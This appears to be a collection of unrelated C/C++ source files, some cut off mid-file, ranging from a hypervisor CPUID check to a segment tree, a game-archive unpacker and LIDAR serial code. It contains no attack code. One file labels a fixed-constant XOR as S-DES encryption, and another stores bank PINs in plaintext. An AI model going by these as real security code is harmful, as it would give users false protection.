    "#include \"../../vmx.hpp\"\n#include <intrin.h>\n\nnamespace VMM\n{\n\tbool VmxIsVirtualizationAvailable()\n\t{\n\t\tchar vendor_name[16] = { 0 };\n\t\tauto registers = VmxQueryCpuid(AMD64_LEAF_MAX_ID);\n\n\t\tmemcpy(vendor_name + 0, &registers.EBX, sizeof(INT32));\n\t\tmemcpy(vendor_name + 4, &registers.EDX, sizeof(INT32));\n\t\tmemcpy(vendor_name + 8, &registers.ECX, sizeof(INT32));\n\n\t\t// Check the CPU vendor against the AMD string\n\t\tif (strcmp(vendor_name, \"AuthenticAMD\"))\n\t\t\treturn false;\n\n\t\tAMD64_PROCESSOR_EXTENDED_FEATURE_ID_ECX processor_features = {\n\t\t\t.Contents = VmxQueryCpuid(\n\t\t\t\tAMD64_LEAF_PROCESSOR_EXTENDED_FEATURE_ID\n\t\t\t).ECX\n\t\t};\n\n\t\t// If the CPU doesn't support SVM\n\t\tif (!processor_features.Fields.Svm)\n\t\t{\n\t\t\tDbgPrintEx(0, 0, \"[VmxIsVirtualizationAvailable]: SVM unavailable!\\n\");\n\t\t\treturn false;\n\t\t}\n\n\t\t// Read SVM features to check if nested paging is available.\n\t\tAMD64_SVM_INFO_EDX svm_features = {\n\t\t\t.Contents = VmxQueryCpuid(\n\t\t\t\tAMD64_LEAF_SVM_INFO\n\t\t\t).EDX\n\t\t};\n\n\t\tif (!svm_features.Fields.NP)\n\t\t{\n\t\t\tDbgPrintEx(0, 0, \"[VmxIsVirtualizationAvailable]: NP unavailable!\\n\");\n\t\t\treturn false;\n\t\t}\n\n\t\tif (!svm_features.Fields.DecodeAssists)\n\t\t{\n\t\t\tDbgPrintEx(0, 0, \"[VmxIsVirtualizationAvailable]: DA unavailable!\\n\");\n\t\t\treturn false;\n\t\t}\n\n\t\t//if (!svm_features.Fields.VGIF)\n\t\t//{\n\t\t//\tDbgPrintEx(0, 0, \"[VmxIsVirtualizationAvailable]: VGIF unavailable!\\n\");\n\t\t//\treturn false;\n\t\t//}\n\n\t\t// Read the VM Control Register and check if SVMDIS is unset.\n\t\t// If it's set, that means SVM is disabled in UEFI.\n\t\tMSR_VM_CR vm_control_register = {\n\t\t\t.Contents = __readmsr(AMD64_MSR_VM_CR)\n\t\t};\n\n\t\tif (vm_control_register.Fields.SVMDIS)\n\t\t\treturn false;\n\n\t\treturn true;\n\t}\n\n\tbool VmxIsHypervisorAvailable()\n\t{\n\t\t__try\n\t\t{\n\t\t\tauto result = (__svm_vmmcall(VMCALL_PING, 0) == g_HvTag);\n\t\t\tDbgPrintEx(0, 0, \"[VmxIsHypervisorAvailable]: No exception thrown on core %d!\\n\", VmxGetCurrentCpuIndex());\n\t\t\treturn result;\n\t\t}\n\t\t__except (EXCEPTION_EXECUTE_HANDLER)\n\t\t{\n\t\t\tDbgPrintEx(0, 0, \"[VmxIsHypervisorAvailable]: EXCEPTION_EXECUTE_HANDLER on core %d!\\n\", VmxGetCurrentCpuIndex());\n\t\t\treturn false;\n\t\t}\n\t}\n\n\tbool VmxIsHypervisorBitSet()\n\t{\n\t\treturn (VmxQueryCpuid(AMD64_LEAF_PROCESSOR_FEATURE_ID).ECX & (1 << 31)) != 0;\n\t}\n\n\tVmxCPUID VmxQueryCpuid(\n\t\tIN CPUIDValues Leaf\n\t)\n\t{\n\t\treturn VmxQueryCpuid(Leaf, static_cast<CPUIDValues>(0));\n\t}\n\n\tVmxCPUID VmxQueryCpuid(\n\t\tIN CPUIDValues Leaf,\n\t\tIN CPUIDValues Subleaf\n\t)\n\t{\n\t\tVmxCPUID registers = { 0 };\n\t\t__cpuidex(reinterpret_cast<int*>(&registers), Leaf, Subleaf);\n\n\t\treturn registers;\n\t}\n\n\tSegmentAttributes VmxpGetSegmentAttributes(\n\t\tIN UINT16 SegmentSelector,\n\t\tIN ULONG_PTR GdtBase\n\t)\n\t{\n\t\tPSegmentDescriptor descriptor;\n\t\tSegmentAttributes attribute;\n\n\t\t// Mask RPL (bits 1:0) to get the selector index + table indicator, then\n\t\t// get the actual address by getting it from the GDT\n\t\tdescriptor = reinterpret_cast<PSegmentDescriptor>(\n\t\t\tGdtBase + (SegmentSelector & ~3));\n\n\t\t// Extract shit into SegmentAttribute structure\n\t\tattribute.Fields.Type = descriptor->Fields.Type;\n\t\tattribute.Fields.System = descriptor->Fields.System;\n\t\tattribute.Fields.Dpl = descriptor->Fields.Dpl;\n\t\tattribute.Fields.Present = descriptor->Fields.Present;\n\t\tattribute.Fields.Avl = descriptor->Fields.Avl;\n\t\tattribute.Fields.LongMode = descriptor->Fields.LongMode;\n\t\tattribute.Fields.DefaultBit = descriptor->Fields.DefaultBit;\n\t\tattribute.Fields.Granularity = descriptor->Fields.Granularity;\n\t\tattribute.Fields.Reserved1 = 0;\n\n\t\treturn attribute;\n\t}\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"unit_7_assignment_duhina\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "// SPDX-License-Identifier: Apache-2.0 WITH LLVM-exception\n\n// This example demonstrates the usage of beman::{{cookiecutter.project_name}}::identity as a default projection in a range-printer.\n// Requires: range support (C++20) and std::identity support (C++20).\n// TODO Darius: Do we need to selectively compile this example?\n// Or should we assume that this project is compiled with C++20 support only?\n\n#include <beman/{{cookiecutter.project_name}}/identity.hpp>\n\n#include <algorithm>\n#include <functional> // std::identity\n#include <iostream>\n#include <ranges>\n#include <string>\n\nnamespace exe = beman::{{cookiecutter.project_name}};\n\n// Class with a pair of values.\nstruct Pair {\n    int         n;\n    std::string s;\n\n    // Output the pair in the form {n, s}.\n    // Used by the range-printer if no custom projection is provided (default: identity projection).\n    friend std::ostream& operator<<(std::ostream& os, const Pair& p) {\n        return os << \"Pair\" << '{' << p.n << \", \" << p.s << '}';\n    }\n};\n\n// A range-printer that can print projected (modified) elements of a range.\n// All the elements of the range are printed in the form {element1, element2, ...}.\n// e.g., pairs with identity: Pair{1, one}, Pair{2, two}, Pair{3, three}\n// e.g., pairs with custom projection: {1:one, 2:two, 3:three}\ntemplate <std::ranges::input_range R, typename Projection>\nvoid print_helper(const std::string_view rem, R&& range, Projection projection) {\n    std::cout << rem << '{';\n    std::ranges::for_each(range, [O = 0](const auto& o) mutable { std::cout << (O++ ? \", \" : \"\") << o; }, projection);\n    std::cout << \"}\\n\";\n};\n\n// Print wrapper with exe::identity.\ntemplate <std::ranges::input_range R,\n          typename Projection = exe::identity> // <- Notice the default projection.\nvoid print_beman(const std::string_view rem, R&& range, Projection projection = {}) {\n    print_helper(rem, range, projection);\n}\n\n// Print wrapper with std::identity.\ntemplate <std::ranges::input_range R,\n          typename Projection = std::identity> // <- Notice the default projection.\nvoid print_std(const std::string_view rem, R&& range, Projection projection = {}) {\n    print_helper(rem, range, projection);\n}\n\nint main() {\n    // A vector of pairs to print.\n    const std::vector<Pair> pairs = {\n        {1, \"one\"},\n        {2, \"two\"},\n        {3, \"three\"},\n    };\n\n    // Print the pairs using the default projection.\n    std::cout << \"Default projection:\\n\";\n    print_beman(\"\\tpairs with beman: \", pairs);\n    print_std(\"\\tpairs with   std: \", pairs);\n\n    // Print the pairs using a custom projection.\n    std::cout << \"Custom projection:\\n\";\n    print_beman(\"\\tpairs with beman: \", pairs, [](const auto& p) { return std::to_string(p.n) + ':' + p.s; });\n    print_std(\"\\tpairs with   std: \", pairs, [](const auto& p) { return std::to_string(p.n) + ':' + p.s; });\n\n    return 0;\n}\n",
    "/*\n * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license\n * Click nbfs://nbhost/SystemFileSystem/Templates/cppFiles/class.cc to edit this template\n */\n\n/* \n * File:   Config.cpp\n * Author: ltsach\n * \n * Created on October 6, 2024, 9:04 PM\n */\n\n#include \"config/Config.h\"\n#include \"sformat/fmt_lib.h\"\n\nConfig::Config(string cfg_filename): m_cfg_filename(cfg_filename) {\n   m_pMap = new xmap<string, string>(&stringHash);\n    //\n   load_default();\n   load_from(cfg_filename);\n}\n\n\n\nConfig::Config(const Config& orig) {\n}\n\nConfig::~Config() {\n    delete m_pMap;\n}\n\nvoid Config::load_default(){\n    m_pMap->put(\"model_root\", \"./models\");\n    m_pMap->put(\"ckpt_name\", \"checkpoint\");\n    m_pMap->put(\"arch_file\", \"arch.txt\");\n    m_pMap->put(\"dataset_root\", \"datasets\");\n}\n\nvoid Config::load_from(string filename){\n    ifstream datastream(filename);\n    if(!datastream.is_open()){\n        string message = fmt::format(\"{:s}: can not open for reading.\", filename); \n        cerr << message << endl;\n        return;\n    }\n    //read header: to be here\n    \n    //read and parse lines\n    string line;\n    while(getline(datastream, line)){\n        //skip empty and comment line (started with #)\n        line = trim(line);\n        if(line.size() == 0) continue;\n        if(line[0] == '#') continue;\n        \n        //parse line\n        char delimiter=':';\n        istringstream linestream(line);\n        string key, value;\n        getline(linestream, key, delimiter); //key: maybe an empty string\n        getline(linestream, value, delimiter); //value: maybe an empty string\n        key = trim(key); value = trim(value);\n        if((key.size() == 0) || (value.size() == 0)) continue;\n        \n        key = to_lower(key);\n        m_pMap->put(key, value);\n    }\n    datastream.close();\n}\nstring Config::get(string key, string def_value){\n    string value;\n    try{\n        value = m_pMap->get(key);\n    }\n    catch(KeyNotFound& e){\n        value = def_value;\n    }\n    return value;\n}\nstring Config::get_new_checkpoint(string model_name){\n    string model_root = get(\"model_root\", \"./models\");\n    string ckpt_name = get(\"ckpt_name\", \"checkpoint\");\n    string model_path = fs::path(model_root) / fs::path(model_name);\n    if(!fs::exists(model_path)) // the first checkpoint: checkpoint-1\n        return fs::path(model_path) / fs::path(ckpt_name + \"-1\");\n    \n    //find the largest idx\n    int largest = 0;\n    for (const auto & entry : fs::directory_iterator(model_path)){\n        if(entry.is_directory()){\n            string path = entry.path().string();\n            string ckpt_idx_str = path.substr(path.rfind(\"-\") + 1);\n            int ckpt_idx;\n            try{\n                ckpt_idx = stoi(ckpt_idx_str);\n            }\n            catch(std::invalid_argument& e){\n                //cout << \"invalid_argument\" << endl;\n                ckpt_idx = -1;\n            }\n            if(largest < ckpt_idx) largest = ckpt_idx;\n        }\n    }\n    int next_idx = largest + 1;\n    string ckpt_folder = ckpt_name + \"-\" + to_string(next_idx);\n    return fs::path(model_path) / fs::path(ckpt_folder);\n}",
    "#include <iostream>\n#include <vector>\nusing namespace std;\n\n#define MAXN 100001\n#define MAXV 30 // Maximum number of bits\n\nint left(int index) {\n    return 2 * index;\n}\n\nint right(int index) {\n    return 2 * index + 1;\n}\n\nint merge(int leftVal, int rightVal) {\n    return (leftVal & rightVal);\n}\n\nvoid apply(int start, int end, int index, vector<int> &sgt, vector<int> &lazy, int val) {\n    sgt[index] |= val;\n    if (start != end) {\n        lazy[left(index)] |= val;\n        lazy[right(index)] |= val;\n    }\n}\n\nvoid pushDown(int start, int end, int index, vector<int> &sgt, vector<int> &lazy) {\n    if (lazy[index] != 0) {\n        sgt[index] |= lazy[index];\n        if (start != end) {\n            lazy[left(index)] |= lazy[index];\n            lazy[right(index)] |= lazy[index];\n        }\n        lazy[index] = 0;\n    }\n}\n\nvoid updateSgt(int start, int end, int index, vector<int> &sgt, vector<int> &lazy, int l, int r, int val) {\n    pushDown(start, end, index, sgt, lazy);\n    if (l <= start && r >= end) {\n        apply(start, end, index, sgt, lazy, val);\n        return;\n    }\n    if (l > end || start > r) {\n        return;\n    }\n    int mid = start + (end - start) / 2;\n    updateSgt(start, mid, left(index), sgt, lazy, l, r, val);\n    updateSgt(mid + 1, end, right(index), sgt, lazy, l, r, val);\n    sgt[index] = merge(sgt[left(index)], sgt[right(index)]);\n}\n\nint querySgt(int start, int end, int index, vector<int> &sgt, vector<int> &lazy, int l, int r) {\n    pushDown(start, end, index, sgt, lazy);\n    if (l <= start && r >= end) {\n        return sgt[index];\n    }\n    if (l > end || start > r) {\n        return (1 << MAXV) - 1; // All bits set to 1\n    }\n    int mid = start + (end - start) / 2;\n    int leftVal = querySgt(start, mid, left(index), sgt, lazy, l, r);\n    int rightVal = querySgt(mid + 1, end, right(index), sgt, lazy, l, r);\n    return merge(leftVal, rightVal);\n}\n\nint main() {\n    ios_base::sync_with_stdio(false);\n    cin.tie(NULL);\n\n    int n, m;\n    cin >> n >> m;\n\n    vector<int> sgt(4 * n, 0);\n    vector<int> lazy(4 * n, 0);\n\n    for (int i = 0; i < m; i++) {\n        int queryType, l, r, val;\n        cin >> queryType >> l >> r;\n        l--; r--; // Adjust indices to 0-based indexing\n        if (queryType == 1) {\n            cin >> val;\n            updateSgt(0, n - 1, 1, sgt, lazy, l, r, val);\n        } else if (queryType == 2) {\n            int result = querySgt(0, n - 1, 1, sgt, lazy, l, r);\n            cout << result << endl;\n        }\n    }\n\n    return 0;\n}\n",
    "\ufeff#include <iostream>\r\n#include <fstream>\r\n#include <vector>\r\n#include <string>\r\n#include <cstring>\r\n#include <filesystem>\r\n#include <algorithm>\r\n#include <map>\r\n#include <iomanip>\r\n\r\nnamespace fs = std::filesystem;\r\n\r\n// \u6587\u4ef6\u6761\u76ee\u7ed3\u6784\r\nstruct FileEntry {\r\n    std::string name;\r\n    uint32_t unpackedSize;\r\n    uint32_t size;\r\n    uint32_t offset;\r\n    uint8_t reserved1[8];    // 0x08-0x0F\r\n    uint8_t reserved2[8];    // 0x1C-0x23\r\n};\r\n\r\nclass MsbBitStream {\r\nprivate:\r\n    std::ifstream& m_input;\r\n    uint32_t m_bits;\r\n    int m_bit_count;\r\n\r\npublic:\r\n    MsbBitStream(std::ifstream& input) : m_input(input), m_bits(0), m_bit_count(0) {}\r\n\r\n    int GetBits(int count) {\r\n        while (m_bit_count < count) {\r\n            int byte = m_input.get();\r\n            if (byte == EOF) return -1;\r\n            m_bits = (m_bits << 8) | byte;\r\n            m_bit_count += 8;\r\n        }\r\n        int result = (m_bits >> (m_bit_count - count)) & ((1 << count) - 1);\r\n        m_bit_count -= count;\r\n        return result;\r\n    }\r\n};\r\n\r\n// LZSS\u89e3\u538b\u7f29\u7c7b\r\nclass LzssDecoder {\r\nprivate:\r\n    uint8_t frame[0x1000];\r\n    int framePos;\r\n\r\npublic:\r\n    LzssDecoder() : framePos(0xFEE) {\r\n        memset(frame, 0, sizeof(frame));\r\n    }\r\n\r\n    size_t decode(const uint8_t* input, size_t inSize, uint8_t* output, size_t outSize) {\r\n        int bits = 2;\r\n        size_t inPos = 0;\r\n        size_t outPos = 0;\r\n\r\n        while (outPos < outSize && inPos < inSize) {\r\n            bits >>= 1;\r\n            if (bits == 1) {\r\n                if (inPos >= inSize) break;\r\n                bits = input[inPos++] | 0x100;\r\n            }\r\n\r\n            if (inPos >= inSize) break;\r\n            uint8_t lo = input[inPos++];\r\n\r\n            if (bits & 1) {\r\n                // \u76f4\u63a5\u5b57\u8282\r\n                output[outPos++] = frame[framePos++ & 0xFFF] = lo;\r\n            }\r\n            else {\r\n                // \u538b\u7f29\u5f15\u7528\r\n                if (inPos >= inSize) break;\r\n                uint8_t hi = input[inPos++];\r\n                int offset = ((hi & 0xF0) << 4) | lo;\r\n                int count = std::min(3 + (hi & 0xF), (int)(outSize - outPos));\r\n\r\n                while (count-- > 0) {\r\n                    uint8_t v = frame[offset++ & 0xFFF];\r\n                    output[outPos++] = frame[framePos++ & 0xFFF] = v;\r\n                }\r\n            }\r\n        }\r\n        return outPos;\r\n    }\r\n};\r\n\r\nclass HuffmanDecoder {\r\nprivate:\r\n    static const int TREE_SIZE = 512;\r\n    uint16_t lhs[TREE_SIZE];\r\n    uint16_t rhs[TREE_SIZE];\r\n    uint16_t m_token;\r\n    MsbBitStream& m_input;\r\n\r\n    uint16_t CreateTree() {\r\n        int bit = m_input.GetBits(1);\r\n        if (bit == -1) {\r\n            throw std::runtime_error(\"Unexpected end of the Huffman-compressed stream.\");\r\n        }\r\n        else if (bit != 0) {\r\n            uint16_t v = m_token++;\r\n            if (v >= TREE_SIZE)\r\n                throw std::runtime_error(\"Invalid Huffman-compressed stream.\");\r\n            lhs[v] = CreateTree();\r\n            rhs[v] = CreateTree();\r\n            return v;\r\n        }\r\n        else {\r\n            return m_input.GetBits(8);\r\n        }\r\n    }\r\n\r\npublic:\r\n    HuffmanDecoder(MsbBitStream& input) : m_input(input), m_token(256) {\r\n        memset(lhs, 0, sizeof(lhs));\r\n        memset(rhs, 0, sizeof(rhs));\r\n    }\r\n\r\n    size_t decode(uint8_t* output, size_t outSize) {\r\n        m_token = 256;\r\n        uint16_t root = CreateTree();\r\n        size_t outPos = 0;\r\n\r\n        while (outPos < outSize) {\r\n            uint16_t symbol = root;\r\n            while (symbol >= 0x100) {\r\n                int bit = m_input.GetBits(1);\r\n                if (bit == -1) return outPos;\r\n                symbol = (bit != 0) ? rhs[symbol] : lhs[symbol];\r\n            }\r\n            output[outPos++] = (uint8_t)symbol;\r\n        }\r\n        return outPos;\r\n    }\r\n};\r\n\r\n// LAX\u6d41\u5904\u7406\u7c7b\r\nclass LaxStream {\r\nprivate:\r\n    std::ifstream& file;\r\n    std::vector<uint8_t> m_buffer;\r\n    size_t m_buffer_size;\r\n    size_t m_buffer_pos;\r\n    bool m_eof;\r\n\r\n    bool readSegment() {\r\n        if (m_eof) return false;\r\n\r\n        // \u8bb0\u5f55\u5f53\u524d\u4f4d\u7f6e\u7528\u4e8eHuffman\u89e3\u538b\r\n        std::streampos chunk_start = file.tellg();\r\n\r\n        // \u8bfb\u53d6\u6bb5\u593410\u5b57\u8282\r\n        uint8_t header[10];\r\n        if (file.read((char*)header, 10).gcount() != 10) {\r\n            m_eof = true;\r\n            return false;\r\n        }\r\n\r\n        // \u68c0\u67e5\"_AF\"\u6807\u8bc6\r\n        if (memcmp(header, \"_AF\", 2) != 0) {\r\n            m_eof = true;\r\n            return false;\r\n        }\r\n\r\n        uint8_t method = header[3];\r\n        uint32_t chunk_size = *(uint16_t*)(header + 4);\r\n        uint32_t final_size = *(uint16_t*)(header + 6);\r\n        uint32_t unpacked_size = *(uint16_t*)(header + 8);\r\n\r\n        // \u786e\u4fdd\u7f13\u51b2\u533a\u8db3\u591f\u5927\r\n        if (m_buffer.size() < unpacked_size)\r\n            m_buffer.resize(unpacked_size);\r\n\r\n        // \u6839\u636e\u65b9\u6cd5\u89e3\u538b\r\n        switch (method) {\r\n        case '1': { // LZSS\r\n            std::vector<uint8_t> compressed(chunk_size - 10);\r\n            if (!file.read((char*)compressed.data(), compressed.size())) {\r\n                m_eof = true;\r\n    ",
    "\n\n/*\n bool add_order(const cqs::types::exchange_symbol_t& symbol,\n                   int64_t seqnum, \n                   double px, \n                   double size, \n                   const std::string& type) \n    \n    {\n        // Construct order message\n        int64_t  epoch_us = cqs::util::epoch_us();\n\n        nlohmann::json order_action;\n        order_action[\"type\"] = \"order\";\n\n        nlohmann::json order;\n        if(_symbol2assetid.find(symbol) != _symbol2assetid.end())\n        {\n            order[\"a\"] = _symbol2assetid[symbol];         // assetid\n        }\n        else\n        {\n            LOG(FATAL) << \" [symbol] \" << symbol << \" not subscribed!\";\n            return false;\n        }\n        order[\"b\"] = size>0;                          // true: buy, false: sell\n        char buf_px[32];\n        std::sprintf(buf_px, \"%.8g\", px);\n        char buf_sz[32];\n        std::sprintf(buf_sz, \"%.8g\", std::fabs(size)); // \"%.8g\"\u683c\u5f0f\u8bf4\u660e\u7b26\u4f1a\u81ea\u52a8\u53bb\u6389\u5c3e\u968f\u96f6\uff0c\u540c\u65f6\u4fdd\u6301\u5408\u9002\u7684\u7cbe\u5ea6,\u786e\u4fdd80000\u8f6c\u6210\u201c80000\u201d\u800c\u4e0d\u662f\u201c80000.000000\u201d\n        order[\"p\"] = std::string(buf_px);              // price\n        order[\"s\"] = std::string(buf_sz);              // size\n        order[\"r\"] = false;                           // reduce only\n\n        nlohmann::json limit;\n        limit[\"tif\"] = \"Gtc\";\n        order[\"t\"][\"limit\"] = limit;                  // time in force\n        order_action[\"orders\"] = nlohmann::json::array({order});\n\n        order_action[\"grouping\"] = \"na\";\n\n        int64_t timestamp = cqs::util::epoch_us()/1000;\n        auto ts1 = cqs::util::epoch_us();\n        dev::bytes connection_id = hyperl::action_hash_order(order_action, _vault_address, timestamp);\n        auto ts2 = cqs::util::epoch_us();\n        auto signature = hyperl::sign_l1_action(connection_id, _wallet);\n        auto ts3 = cqs::util::epoch_us();\n\n        // std::cout << \"connection_id: \" << hyperl::BinaryWriter::bytes_to_hex(connection_id) << \"\\nsignature: \" << signature.dump() << std::endl;\n\n        nlohmann::json payload;\n        payload[\"action\"] = order_action;\n        payload[\"nonce\"] = timestamp;\n        payload[\"signature\"] = signature;\n        payload[\"vaultAddress\"] = dev::toHex(_vault_address);\n        auto ts4 = cqs::util::epoch_us();\n        std::string payload_str = payload.dump();\n        // std::cout << \"payload_str: \" << payload_str << std::endl;\n\n        add_request(_host.c_str(),\"443\",\"/exchange\",payload_str.c_str(),boost::beast::http::verb::post,seqnum);\n        auto ts5 = cqs::util::epoch_us();\n        {\n            std::lock_guard<std::mutex> lock(m_mutex);\n            _request2lo_rest[seqnum] = cqs::types::LO(symbol,px,size,seqnum);\n            // _oid2request[seqnum] = seqnum;\n            // _request2event[seqnum] = 'A';\n        }\n        auto ts6 = cqs::util::epoch_us();\n\n        LOG(INFO) << \" [ts0] \" << epoch_us << \" [ts1] \" << ts1 << \" [ts2] \" << ts2 << \" [ts3] \" << ts3 << \" [ts4] \" << ts4 << \" [ts5] \" << ts5 << \" [ts6] \" << ts6;\n\n        return true;\n    }\n\n    void del_order(const exchange_symbol_t& symbol, int64_t clientOrderId)\n    {\n        nlohmann::json cancel_action;\n        cancel_action[\"type\"] = \"cancel\";\n        nlohmann::json cancel;\n        cancel[\"a\"] = _symbol2assetid[symbol];\n        cancel[\"o\"] = _oid2exchangeoid[clientOrderId];\n        cancel_action[\"cancels\"] = nlohmann::json::array({cancel});\n\n\n        int64_t timestamp = cqs::util::epoch_us()/1000;\n        dev::bytes connection_id = hyperl::action_hash_cancel(cancel_action, _vault_address, timestamp);\n        auto signature = hyperl::sign_l1_action(connection_id, _wallet);\n\n        nlohmann::json payload;\n        payload[\"action\"] = cancel_action;\n        payload[\"nonce\"] = timestamp;\n        payload[\"signature\"] = signature;\n        payload[\"vaultAddress\"] = dev::toHex(_vault_address);\n        std::string payload_str = payload.dump();\n\n        add_request(_host.c_str(),\"443\",\"/exchange\",payload_str.c_str(),boost::beast::http::verb::post,clientOrderId);\n\n    }\n\n*/",
    "#include <stdio.h>\r\n#include <stdlib.h>\r\ntypedef unsigned char byte;\r\nvoid generateRoundKeys(byte key, byte *k1, byte *k2) {\r\n *k1 = 0xF3;\r\n *k2 = 0xE3;\r\n}\r\nbyte sdesEncrypt(byte plaintext, byte key) {\r\n byte k1, k2;\r\n generateRoundKeys(key, &k1, &k2);\r\n return plaintext ^ k1;\r\n}\r\nvoid ctrEncrypt(byte *plaintext, byte key, int length) {\r\n byte counter = 0x00;\r\n int i;\r\n\r\n for ( i = 0; i < length; i++) {\r\n byte encrypted = sdesEncrypt(counter, key);\r\n plaintext[i] ^= encrypted;\r\n counter++;\r\n }\r\n}\r\nint main() {\r\n byte key = 0xFD;\r\n byte plaintext[] = {0x01, 0x02, 0x04};\r\n int length = sizeof(plaintext);\r\n int i;\r\n printf(\"Plaintext: \");\r\n for ( i = 0; i < length; i++) {\r\n printf(\"%02X \", plaintext[i]);\r\n }\r\n ctrEncrypt(plaintext, key, length);\r\n printf(\"\\nEncrypted: \");\r\n for (i = 0; i < length; i++) {\r\n printf(\"%02X \", plaintext[i]);\r\n }\r\n ctrEncrypt(plaintext, key, length);\r\n printf(\"\\nDecrypted: \");\r\n for (i = 0; i < length; i++) {\r\n printf(\"%02X \", plaintext[i]);\r\n }\r\n printf(\"\\n\");\r\n return 0;\r\n}\r\n",
    "#include <iostream>\n#include <string>\n#include <cctype>\n#include <vector>\n#include <fstream>\n\nusing namespace std;\n\nstring ClientsFileName = \"Clients.txt\";\n\nstruct stClient\n{\n    string AccountNumber = \"\";\n    string PinCode = \"\";\n    string Name = \"\";\n    string Phone = \"\";\n    double Balance = 0;\n};\n\nstClient ReadNewClient()\n{\n\n    stClient Client;\n\n    cout << \"Enter client account number\\n\";\n    getline(cin >> ws , Client.AccountNumber);\n\n    cout << \"Enter client pin code\\n\";\n    getline(cin , Client.PinCode);\n\n    cout << \"Enter client name \\n\";\n    getline(cin, Client.Name);\n\n    cout << \"Enter client phone number\\n\";\n    getline(cin, Client.Phone);\n\n    cout << \"Enter client account balance\\n\";\n    cin >> Client.Balance;\n    \n    return Client;\n\n}\n\nstring ConvertRecordToLine(stClient Client , string Delem = \"#//#\")\n{\n\n    string Line;\n    Line += Client.AccountNumber + Delem;\n    Line += Client.PinCode + Delem;\n    Line += Client.Name + Delem;\n    Line += Client.Phone + Delem;\n    Line += to_string(Client.Balance);\n\n    return Line;\n\n}\n\nvoid AddRecordToFile(string Record , string FileName)\n{\n\n    fstream MyFile;\n\n    MyFile.open(FileName, ios::out | ios::app);\n\n    if (MyFile.is_open())\n    {\n\n        MyFile << Record << endl;\n        MyFile.close();\n\n    }\n\n}\n\nvoid AddNewClient()\n{\n\n    stClient Client;\n\n    Client = ReadNewClient();\n\n    AddRecordToFile(ConvertRecordToLine(Client), ClientsFileName);\n\n}\n\nvoid AddClients()\n{\n\n    stClient Client;\n    char EnterMoreClients = 'Y';\n\n    do\n    {\n        system(\"cls\");\n        cout << \"Enter client information:\\n\";\n        AddNewClient();\n\n        cout << \"Client added sucsessfully , do you want to enter more [y] [n]?\";\n        cin >> EnterMoreClients;\n\n    } while (toupper(EnterMoreClients) == 'Y');\n\n\n}\n\n\nint main()\n{\n    \n    AddClients();\n\n    return 0;\n}\n",
    "/*\n *  RPLIDAR SDK\n *\n *  Copyright (c) 2009 - 2014 RoboPeak Team\n *  http://www.robopeak.com\n *  Copyright (c) 2014 - 2020 Shanghai Slamtec Co., Ltd.\n *  http://www.slamtec.com\n *\n */\n/*\n * Redistribution and use in source and binary forms, with or without\n * modification, are permitted provided that the following conditions are met:\n *\n * 1. Redistributions of source code must retain the above copyright notice,\n *    this list of conditions and the following disclaimer.\n *\n * 2. Redistributions in binary form must reproduce the above copyright notice,\n *    this list of conditions and the following disclaimer in the documentation\n *    and/or other materials provided with the distribution.\n *\n * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\"\n * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO,\n * THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR\n * PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR\n * CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,\n * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,\n * PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS;\n * OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,\n * WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR\n * OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,\n * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n *\n */\n\n#include \"sdkcommon.h\"\n#include \"net_serial.h\"\n\nnamespace rp{ namespace arch{ namespace net{\n\nraw_serial::raw_serial()\n    : rp::hal::serial_rxtx()\n    , _serial_handle(NULL)\n    , _baudrate(0)\n    , _flags(0)\n{\n    _init();\n}\n\nraw_serial::~raw_serial()\n{\n    close();\n\n    CloseHandle(_ro.hEvent);\n    CloseHandle(_wo.hEvent);\n    CloseHandle(_wait_o.hEvent);\n}\n\nbool raw_serial::open()\n{\n    return open(_portName, _baudrate, _flags);\n}\n\nbool raw_serial::bind(const char * portname, _u32 baudrate, _u32 flags)\n{   \n    strncpy(_portName, portname, sizeof(_portName));\n    _baudrate = baudrate;\n    _flags    = flags;\n    return true;\n}\n\nbool raw_serial::open(const char * portname, _u32 baudrate, _u32 flags)\n{\n#ifdef _UNICODE\n    wchar_t wportname[1024];\n    mbstowcs(wportname, portname, sizeof(wportname) / sizeof(wchar_t));\n#endif\n\n    if (isOpened()) close();\n    \n    _serial_handle = CreateFile(\n#ifdef _UNICODE\n        wportname,\n#else\n        portname,\n#endif\n        GENERIC_READ | GENERIC_WRITE,\n        0,\n        NULL,\n        OPEN_EXISTING,\n        